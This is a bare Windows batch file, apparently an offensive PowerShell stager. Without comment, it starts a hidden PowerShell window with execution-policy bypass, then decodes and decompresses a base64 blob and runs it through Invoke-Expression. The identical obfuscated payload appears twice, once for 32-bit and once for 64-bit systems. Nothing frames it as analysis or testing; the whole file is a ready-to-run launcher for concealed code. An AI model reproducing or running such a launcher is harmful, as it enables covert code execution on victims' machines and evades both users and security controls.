@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"pVbda9swEH/PXyGCH2IaF9nyVxoK7VYGgzEGLdtDyIMsy6uZYwdb6dJ9/O/TnS25bloY28tJpzvd73d3kmVHkEtyNZ9tbqrq/W7ftGox/ybbWlYsOM+rau5uyf6QVaUgneJKD/KotJ28r9Un1ZLPZasOvLquqkYshrXvS3Ioa0WOw/g4jD/c9T/jvG0lV/LuXg+5wTkMcR+WZEQeZk+wh5Xn6LvuQbTqb7B3ctdJtTiNbLOaX82cRhfyOs+9u8e9JJ7ek8n2RhZlXaqyqYkjiPeR7ySZfylrFsyJV2ut23MhCa68O9QCPDvi7XnXqfv2MHOOl05zcTEpMl3So08pDKwfQuquyebNo5Kb7dbpoKP0WAhtkakWaaAFOo4iBpGuwCWCQL4WAg0hGDItoh7BqhhFTFTfOiegBoBGCy2yBGhxWItN+AIMHAIwEDGsJTCjuBdmAaAJ5ALONAeBKsST4FcEBjxKplwsU8RllmkIMx/RgJ9ksJaayDmIyLehVoZGb2U2Chh8G4Bxs4ZWZgvRb3sh6VfTYhgUIBNoRQF7KWAk4FeAlWVGDULjJ2EWpZZ4aqwj8Ti2rIBBmE2cfXGaJX2Whz0lYWjCo4gyI7CNWLWIm0pi0phRVFjBTWQfuiWRC2QUgYgxSyzs9LCiIYEyJdbaxwuNFfuLLnjWaGI44+FHLphHBurKtnbECMBZhCZoZHHRkKKaGec+HjQghowoN854ezjMYjx6iTHQMSPAzTLLLzZoz0T4wgxDSYREBrbEI6FVYljhXYgwvKWxAkgOfklo+jbuTSOTAloxLbSGEtTUnjr7VYmTSRH7bvHpLDylgdXIseKp6eUTGtBkPPIYJQFwZk8xzjByaEtCqcl3pBHFUy4IBIIjIcDAr96T0jFjGLf1xNl/sMcLa8FHuuFrVRs7TSHfoDDtZtNOj4SwKTGUKcxPuxpJI3ANvwL9N6IwPU9s5FFISHCVnRr6jxZk2d+Z2DAQ1oDHu8D7BgYenPYDazqQXM+KpiULp7yka6ckXiW10onzD7L+qu4939WrZ2cu+QnP4PAOb/qHeLtwjud3jVZYsHDPnNJdEr1145TbJfFd8os0B+XVh6pa/545P/AhnfxFaC5L57iEAR7QW8Vb5d1WUu6JdytFU+cE3llK/wA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"pVbda9swEH/PXyGCH2IaF9nyVxoK7VYGgzEGLdtDyIMsy6uZYwdb6dJ9/O/TnS25bloY28tJpzvd73d3kmVHkEtyNZ9tbqrq/W7ftGox/ybbWlYsOM+rau5uyf6QVaUgneJKD/KotJ28r9Un1ZLPZasOvLquqkYshrXvS3Ioa0WOw/g4jD/c9T/jvG0lV/LuXg+5wTkMcR+WZEQeZk+wh5Xn6LvuQbTqb7B3ctdJtTiNbLOaX82cRhfyOs+9u8e9JJ7ek8n2RhZlXaqyqYkjiPeR7ySZfylrFsyJV2ut23MhCa68O9QCPDvi7XnXqfv2MHOOl05zcTEpMl3So08pDKwfQuquyebNo5Kb7dbpoKP0WAhtkakWaaAFOo4iBpGuwCWCQL4WAg0hGDItoh7BqhhFTFTfOiegBoBGCy2yBGhxWItN+AIMHAIwEDGsJTCjuBdmAaAJ5ALONAeBKsST4FcEBjxKplwsU8RllmkIMx/RgJ9ksJaayDmIyLehVoZGb2U2Chh8G4Bxs4ZWZgvRb3sh6VfTYhgUIBNoRQF7KWAk4FeAlWVGDULjJ2EWpZZ4aqwj8Ti2rIBBmE2cfXGaJX2Whz0lYWjCo4gyI7CNWLWIm0pi0phRVFjBTWQfuiWRC2QUgYgxSyzs9LCiIYEyJdbaxwuNFfuLLnjWaGI44+FHLphHBurKtnbECMBZhCZoZHHRkKKaGec+HjQghowoN854ezjMYjx6iTHQMSPAzTLLLzZoz0T4wgxDSYREBrbEI6FVYljhXYgwvKWxAkgOfklo+jbuTSOTAloxLbSGEtTUnjr7VYmTSRH7bvHpLDylgdXIseKp6eUTGtBkPPIYJQFwZk8xzjByaEtCqcl3pBHFUy4IBIIjIcDAr96T0jFjGLf1xNl/sMcLa8FHuuFrVRs7TSHfoDDtZtNOj4SwKTGUKcxPuxpJI3ANvwL9N6IwPU9s5FFISHCVnRr6jxZk2d+Z2DAQ1oDHu8D7BgYenPYDazqQXM+KpiULp7yka6ckXiW10onzD7L+qu4939WrZ2cu+QnP4PAOb/qHeLtwjud3jVZYsHDPnNJdEr1145TbJfFd8os0B+XVh6pa/545P/AhnfxFaC5L57iEAR7QW8Vb5d1WUu6JdytFU+cE3llK/wA=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")